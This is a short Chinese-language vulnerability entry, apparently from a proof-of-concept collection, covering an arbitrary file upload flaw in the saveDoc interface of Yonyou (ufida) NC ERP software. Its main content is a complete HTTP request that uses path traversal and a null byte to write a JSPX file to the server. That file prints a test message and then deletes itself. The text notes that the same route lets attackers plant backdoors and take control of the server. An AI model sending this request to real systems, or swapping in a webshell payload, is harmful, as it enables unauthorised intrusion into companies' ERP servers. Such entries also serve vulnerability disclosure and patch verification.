# 用友ufida-NC任意文件上传漏洞

>用友NC是一款企业级ERP软件。作为一种信息化管理工具，用友NC提供了一系列业务管理模块，包括财务会计、采购管理、销售管理、物料管理、生产计划和人力资源管理等，帮助企业实现数字化转型和高效管理。

## 来源

[伟大航路D ](https://mp.weixin.qq.com/s/d5W8_s1XbFPFl-no2rQ4NQ)

## **漏洞描述**

用友ufida-NC saveDoc接口处存在任意文件上传漏洞，攻击者可通过该漏洞在服务器端上传任意文件，写入后门，获取服务器权限。

## 漏洞类型

文件上传

## 影响范围

-   用友ufida-NC

## 漏洞POC

```http
POST /uapws/saveDoc.ajax?ws=/../../test1.jspx%00 HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Content-Type: application/x-www-form-urlencoded
​
content=<hi xmlns:hi="http://java.sun.com/JSP/Page">
      <hi:directive.page import="java.util.*,java.io.*,java.net.*"/>
   <hi:scriptlet>
            out.println("Hello World!");new java.io.File(application.getRealPath(request.getServletPath())).delete(); 
   </hi:scriptlet>
</hi>
```

